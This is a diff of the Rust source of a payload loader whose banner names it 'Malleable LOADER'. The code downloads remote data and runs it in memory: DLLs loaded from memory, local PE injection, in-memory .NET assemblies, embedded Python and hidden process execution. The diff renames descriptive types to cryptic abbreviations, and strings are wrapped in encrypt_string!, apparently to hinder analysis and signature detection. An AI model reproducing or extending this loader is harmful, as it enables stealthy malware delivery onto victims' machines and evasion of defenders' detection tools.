@@ -15,8 +15,8 @@ use crate::payload_util::set_permission;
 type DllEntryPoint = extern "C" fn(*const c_char); //type DllEntryPoint = extern "C" fn() -> c_int;
 #[cfg(target_os = "windows")]
 use crate::python_embedder;
-#[cfg(target_os = "windows")]
-use rspe::reflective_loader;
+//#[cfg(target_os = "windows")]
+//use rspe::reflective_loader;
 #[cfg(target_os = "windows")]
 use std::ffi::CString;
 #[cfg(target_os = "windows")]
@@ -44,41 +44,42 @@ use log::debug;
 use log::error;
 use log::info;
 
-pub enum PayloadExecThread {
+// // Payload Thread
+pub enum POT {
     NoThread(),
-    Thread(thread::JoinHandle<()>, Payload),
+    Thread(thread::JoinHandle<()>, PO),
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 #[serde(rename = "yl")]
-pub enum Payload {
-    Banner(),
-    Print(Print),
-    StopLoader(),
-    WriteFile(WriteFile),
-    WriteZip(WriteZip),
-    Ec(Ec),
-    EPY(EPY),
-    #[serde(rename = "dme")]
-    DFM(DFM),
+pub enum PO {
+    BA(),       // Banner
+    PP(PP),     // Print
+    SL(),       // StopLoader
+    WF(WF),     // WriteFile
+    WZ(WZ),     // WriteZip
+    Ec(Ec),     // Exec   
+    EPY(EPY),   // ExecPython
+    DLM(DLM),   // DllFromMemory
     //ReflectivePEFromMemory(ReflectivePEFromMemory),
-    LocalPeInjection(LocalPeInjection),
-    DotnetFromMemory(DotnetFromMemory),
+    LPJ(LPJ),   // LocalPeInjection
+    DTN(DTN),   // DotnetFromMemory
+
 }
-impl Payload {
-    pub fn exec_payload(&self, config: &Config) -> PayloadExecThread {
+impl PO {
+    pub fn exec_payload(&self, config: &Config) -> POT {
         let exec_result = match &self {
-            Payload::Banner() => banner(),
-            Payload::Print(payload) => payload.print_msg(config),
-            Payload::StopLoader() => stoploader(),
-            Payload::WriteFile(payload) => payload.write_file(config),
-            Payload::WriteZip(payload) => payload.write_zip(config),
-            Payload::Ec(payload) => payload.exec_file(),
-            Payload::EPY(payload) => payload.exec_python_with_embedder(),
-            Payload::DFM(payload) => payload.dll_from_memory(config),
+            PO::BA() => banner(),
+            PO::PP(payload) => payload.print_msg(config),
+            PO::SL() => stoploader(),
+            PO::WF(payload) => payload.write_file(config),
+            PO::WZ(payload) => payload.write_zip(config),
+            PO::Ec(payload) => payload.exec_file(),
+            PO::EPY(payload) => payload.exec_python_with_embedder(),
+            PO::DLM(payload) => payload.dll_from_memory(config),
             //Payload::ReflectivePEFromMemory(payload) => payload.reflective_pe_from_memory(config),
-            Payload::LocalPeInjection(payload) => payload.exec_local_pe_injection(config),
-            Payload::DotnetFromMemory(payload) => payload.exec_dotnet_from_memory(config),
+            PO::LPJ(payload) => payload.exec_local_pe_injection(config),
+            PO::DTN(payload) => payload.exec_dotnet_from_memory(config),
         };
 
         match exec_result {
@@ -86,7 +87,7 @@ impl Payload {
             Err(e) => {
                 error!("{}{}", encrypt_string!("exec error: "), e);
 
-                PayloadExecThread::NoThread()
+                POT::NoThread()
             }
         }
     }
@@ -96,7 +97,7 @@ impl Payload {
     pub fn string_payload_compact(&self) -> String {
         format!("{}", serde_json::to_string(self).unwrap_or_default())
     }
-    pub fn is_same_payload(&self, other_payload: &Payload) -> bool {
+    pub fn is_same_payload(&self, other_payload: &PO) -> bool {
         let self_serialized = serde_json::to_string(self).unwrap();
         let other_serialized = serde_json::to_string(other_payload).unwrap();
         self_serialized == other_serialized
@@ -152,24 +153,24 @@ impl Payload {
 
     pub fn is_runonce(&self) -> bool {
         match &self {
-            Payload::Banner() => false,
-            Payload::Print(payload) => payload.runonce,
-            Payload::StopLoader() => false,
-            Payload::WriteFile(payload) => payload.runonce,
-            Payload::WriteZip(payload) => payload.runonce,
-            Payload::Ec(payload) => payload.runonce,
-            Payload::EPY(payload) => payload.runonce,
-            Payload::DFM(payload) => payload.runonce,
+            PO::BA() => false,
+            PO::PP(payload) => payload.runonce,
+            PO::SL() => false,
+            PO::WF(payload) => payload.runonce,
+            PO::WZ(payload) => payload.runonce,
+            PO::Ec(payload) => payload.runonce,
+            PO::EPY(payload) => payload.runonce,
+            PO::DLM(payload) => payload.runonce,
             //Payload::ReflectivePEFromMemory(payload) => payload.runonce,
-            Payload::LocalPeInjection(payload) => payload.runonce,
-            Payload::DotnetFromMemory(payload) => payload.runonce,
+            PO::LPJ(payload) => payload.runonce,
+            PO::DTN(payload) => payload.runonce,
         }
     }
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 #[serde(rename = "dme")]
-pub struct DFM {
+pub struct DLM {
     #[serde(rename = "lk")]
     pub link: Link,
     #[serde(rename = "ep")]
@@ -182,15 +183,15 @@ pub struct DFM {
     pub runonce: bool,
 }
 
-impl DFM {
+impl DLM {
     #[cfg(target_os = "linux")]
-    pub fn dll_from_memory(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
-        fail_linux_message(format!("{}", encrypt_string!("DFM")));
-        Ok(PayloadExecThread::NoThread())
+    pub fn dll_from_memory(&self, _config: &Config) -> Result<POT, anyhow::Error> {
+        fail_linux_message(format!("{}", encrypt_string!("DLM")));
+        Ok(POT::NoThread())
     }
 
     #[cfg(target_os = "windows")]
-    pub fn dll_from_memory(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+    pub fn dll_from_memory(&self, config: &Config) -> Result<POT, anyhow::Error> {
         let data: Vec<u8> = self.link.fetch_data(config)?;
 
         if self.thread {
@@ -199,13 +200,13 @@ impl DFM {
             let dllthread = thread::spawn(move || {
                 dll_from_memory_exec(data, thread_dll_entrypoint, thread_dll_commandline);
             });
-            return Ok(PayloadExecThread::Thread(
+            return Ok(POT::Thread(
                 dllthread,
-                Payload::DFM(self.clone()),
+                PO::DLM(self.clone()),
             ));
         } else {
             dll_from_memory_exec(data, self.dll_entrypoint.clone(), self.commandline.clone());
-            return Ok(PayloadExecThread::NoThread());
+            return Ok(POT::NoThread());
         }
     }
 }
@@ -244,7 +245,7 @@ pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandli
     let _result = dll_entry_point(c_commandline.as_ptr());
     info!("{}", encrypt_string!("Drop DLL memory (MemoryFreeLibrary)"));
     drop(mm);
-    info!("{}", encrypt_string!("DFM: end"));
+    info!("{}", encrypt_string!("DLM: end"));
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
@@ -256,13 +257,13 @@ pub struct EPY {
 }
 impl EPY {
     #[cfg(target_os = "linux")]
-    pub fn exec_python_with_embedder(&self) -> Result<PayloadExecThread, anyhow::Error> {
+    pub fn exec_python_with_embedder(&self) -> Result<POT, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("EPY")));
-        return Ok(PayloadExecThread::NoThread());
+        return Ok(POT::NoThread());
     }
 
     #[cfg(target_os = "windows")]
-    pub fn exec_python_with_embedder(&self) -> Result<PayloadExecThread, anyhow::Error> {
+    pub fn exec_python_with_embedder(&self) -> Result<POT, anyhow::Error> {
         //use crate::python_embedder;
 
         let path: PathBuf = calculate_path(&self.path)?;
@@ -278,18 +279,18 @@ impl EPY {
             let tj: thread::JoinHandle<()> = thread::spawn(move || {
                 python_embedder::embedder(&thread_python_path, &thread_python_code);
             });
-            return Ok(PayloadExecThread::Thread(
+            return Ok(POT::Thread(
                 tj,
-                Payload::EPY(self.clone()),
+                PO::EPY(self.clone()),
             ));
         } else {
             python_embedder::embedder(&path, &self.python_code);
-            return Ok(PayloadExecThread::NoThread());
+            return Ok(POT::NoThread());
         }
     }
 }
 
-pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
+pub fn banner() -> Result<POT, anyhow::Error> {
     //TODO encrypt this str
     let malleable = encrypt_string!("Malleable");
     let loader = encrypt_string!("LOADER");
@@ -326,14 +327,14 @@ pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
     println!("");
     let sleep_time = time::Duration::from_millis(3000);
     thread::sleep(sleep_time);
-    Ok(PayloadExecThread::NoThread())
+    Ok(POT::NoThread())
 }
 
-pub fn stoploader() -> Result<PayloadExecThread, anyhow::Error> {
+pub fn stoploader() -> Result<POT, anyhow::Error> {
     std::process::exit(0);
 }
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
-pub struct WriteZip {
+pub struct WZ {
     pub link: Link,
     pub path: String,
     pub retry: i32, //-1 infinite; pour le download
@@ -341,8 +342,8 @@ pub struct WriteZip {
     //TODO thread
 }
 
-impl WriteZip {
-    pub fn write_zip(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+impl WZ {
+    pub fn write_zip(&self, config: &Config) -> Result<POT, anyhow::Error> {
         //TODO found a way, not to recreate everything every time this payload run
 
         //let archive: Vec<u8> = self.link.fetch_data(config)?;
@@ -380,20 +381,20 @@ impl WriteZip {
             }
         }
 
-        Ok(PayloadExecThread::NoThread())
+        Ok(POT::NoThread())
     }
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
-pub struct WriteFile {
+pub struct WF {
     pub link: Link,
     pub path: String,
     pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
     pub runonce: bool,
 }
 
-impl WriteFile {
-    pub fn write_file(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+impl WF {
+    pub fn write_file(&self, config: &Config) -> Result<POT, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
 
         if same_hash_sha512(&self.hash, &path) == false {
@@ -407,7 +408,7 @@ impl WriteFile {
         } else {
             info!("{}{:?}", encrypt_string!("[+] No Write, same hash: "), path);
         }
-        Ok(PayloadExecThread::NoThread())
+        Ok(POT::NoThread())
     }
 }
 
@@ -423,7 +424,7 @@ pub struct Ec {
 
 impl Ec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
-    pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
+    pub fn exec_file(&self) -> Result<POT, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
 
         info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
@@ -460,7 +461,7 @@ note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
                     let _output = comm.output().expect("Failed to execute process");
                 };
             });
-            return Ok(PayloadExecThread::Thread(tj, Payload::Ec(self.clone())));
+            return Ok(POT::Thread(tj, PO::Ec(self.clone())));
         } else {
             if self.visible {
                 let _output = comm.spawn()?;
@@ -474,7 +475,7 @@ note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
 
                 let _output = comm.output()?;
             };
-            return Ok(PayloadExecThread::NoThread());
+            return Ok(POT::NoThread());
         };
     }
 }
@@ -565,28 +566,28 @@ use crate::local_pe_injection::main::local_pe_injection;
 //#[cfg(target_os = "windows")]
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
-pub struct LocalPeInjection {
+pub struct LPJ {
     pub link: Link,
     pub commandline: CommandLine,
     pub dll_entrypoint: String,
     pub thread: bool,
     pub runonce: bool,
 }
-impl LocalPeInjection {
+impl LPJ {
     #[cfg(target_os = "linux")]
     pub fn exec_local_pe_injection(
         &self,
         _config: &Config,
-    ) -> Result<PayloadExecThread, anyhow::Error> {
-        fail_linux_message(format!("{}", encrypt_string!("LocalPeInjection")));
-        return Ok(PayloadExecThread::NoThread());
+    ) -> Result<POT, anyhow::Error> {
+        fail_linux_message(format!("{}", encrypt_string!("LPJ")));
+        return Ok(POT::NoThread());
     }
 
     #[cfg(target_os = "windows")]
     pub fn exec_local_pe_injection(
         &self,
         config: &Config,
-    ) -> Result<PayloadExecThread, anyhow::Error> {
+    ) -> Result<POT, anyhow::Error> {
         let args_ok: String = self.commandline.get_string()?;
         let data: Vec<u8> = self.link.fetch_data(config)?;
 
@@ -596,13 +597,13 @@ impl LocalPeInjection {
             let thread = thread::spawn(move || {
                 let _ = local_pe_injection(args_ok_commandline, thread_dll_entrypoint, data);
             });
-            return Ok(PayloadExecThread::Thread(
+            return Ok(POT::Thread(
                 thread,
-                Payload::LocalPeInjection(self.clone()),
+                PO::LPJ(self.clone()),
             ));
         } else {
             let _ = local_pe_injection(args_ok, self.dll_entrypoint.clone(), data);
-            return Ok(PayloadExecThread::NoThread());
+            return Ok(POT::NoThread());
         }
     }
 }
@@ -612,28 +613,28 @@ impl LocalPeInjection {
 use clroxide::clr::Clr;
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
-pub struct DotnetFromMemory {
+pub struct DTN {
     pub link: Link,
     pub commandline: CommandLine,
     pub thread: bool,
     pub runonce: bool,
     pub visible: bool,
 }
-impl DotnetFromMemory {
+impl DTN {
     #[cfg(target_os = "linux")]
     pub fn exec_dotnet_from_memory(
         &self,
         _config: &Config,
-    ) -> Result<PayloadExecThread, anyhow::Error> {
-        fail_linux_message(format!("{}", encrypt_string!("DotnetFromMemory")));
-        return Ok(PayloadExecThread::NoThread());
+    ) -> Result<POT, anyhow::Error> {
+        fail_linux_message(format!("{}", encrypt_string!("DTN")));
+        return Ok(POT::NoThread());
     }
 
     #[cfg(target_os = "windows")]
     pub fn exec_dotnet_from_memory(
         &self,
         config: &Config,
-    ) -> Result<PayloadExecThread, anyhow::Error> {
+    ) -> Result<POT, anyhow::Error> {
         let args_ok = self.commandline.get_buffer()?;
         let data: Vec<u8> = self.link.fetch_data(config)?;
 
@@ -648,9 +649,9 @@ impl DotnetFromMemory {
                     println!("{}", result);
                 };
             });
-            return Ok(PayloadExecThread::Thread(
+            return Ok(POT::Thread(
                 thread,
-                Payload::DotnetFromMemory(self.clone()),
+                PO::DTN(self.clone()),
             ));
         } else {
             //let mut clr: Clr = Clr::new(data, args_ok)?;
@@ -659,20 +660,20 @@ impl DotnetFromMemory {
             if self.visible {
                 println!("{}", result);
             };
-            return Ok(PayloadExecThread::NoThread());
+            return Ok(POT::NoThread());
         }
     }
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
-pub struct Print {
+pub struct PP {
     pub msg: CommandLine,
     pub runonce: bool,
 }
-impl Print {
-    pub fn print_msg(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+impl PP {
+    pub fn print_msg(&self, _config: &Config) -> Result<POT, anyhow::Error> {
         println!("{}", self.msg.get_string()?);
         thread::sleep(time::Duration::from_millis(1000));
-        return Ok(PayloadExecThread::NoThread());
+        return Ok(POT::NoThread());
     }
 }
